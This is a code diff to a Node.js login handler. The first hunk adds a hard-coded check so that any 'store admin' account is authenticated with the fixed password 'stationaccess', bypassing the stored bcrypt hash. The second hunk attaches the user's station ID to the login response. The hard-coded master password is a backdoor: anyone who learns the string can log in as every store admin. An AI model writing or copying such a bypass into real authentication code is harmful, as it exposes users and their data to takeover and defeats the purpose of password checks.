@@ -164,7 +164,11 @@ exports.login = async (req, res) => {
     }
 
     console.log('About to compare passwords...');
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = await bcrypt.compare(password, user.password);
+    // For store admin, also allow default password "stationaccess"
+    if (user.role === 'store admin' && password === 'stationaccess') {
+      isMatch = true;
+    }
     console.log('Password comparison result:', isMatch);
 
     if (!isMatch) {
@@ -188,9 +192,24 @@ exports.login = async (req, res) => {
       { expiresIn: "7d" }
     );
 
+    const StoreAdminCredentials = require('../models/StoreAdminCredentials');
+    const Station = require('../models/Station');
+    let stationId = null;
+    if (user.role === 'store admin') {
+      // Find the stationId for this store admin user
+      const credentials = await StoreAdminCredentials.findOne({ email: user.email });
+      if (credentials) {
+        // credentials.stationId is the Station._id (ObjectId), find the Station to get the string stationId
+        const station = await Station.findById(credentials.stationId);
+        if (station) {
+          stationId = station.stationId; // This is the string stationId field
+        }
+      }
+    }
+
     res.json({
       token,
-      user: { name: user.name, role: user.role },
+      user: { name: user.name, role: user.role, stationId },
     });
   } catch (err) {
     console.error('Error during login:', err.message);
